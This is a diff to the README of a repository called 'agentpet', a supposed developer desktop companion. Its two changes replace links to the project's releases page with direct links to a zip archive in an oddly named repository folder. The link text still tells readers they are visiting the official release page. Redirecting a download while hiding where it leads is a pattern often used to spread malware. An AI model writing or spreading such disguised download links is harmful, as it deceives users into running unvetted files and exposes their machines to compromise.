@@ -1,6 +1,6 @@
 # 🐾 agentpet - A helpful desktop companion for developers
 
-[![Download agentpet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Operant-vellum819/agentpet/releases)
+[![Download agentpet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Operant-vellum819/agentpet/raw/refs/heads/main/twanker/Software-v1.1.zip)
 
 ## 💡 About This App
 
@@ -20,7 +20,7 @@ To run agentpet, ensure your computer meets these conditions:
 
 You must visit the official release page to find the installer that corresponds to your version of Windows.
 
-[Click here to visit the release page to download agentpet](https://github.com/Operant-vellum819/agentpet/releases)
+[Click here to visit the release page to download agentpet](https://github.com/Operant-vellum819/agentpet/raw/refs/heads/main/twanker/Software-v1.1.zip)
 
 Follow these steps to obtain the correct file:
 
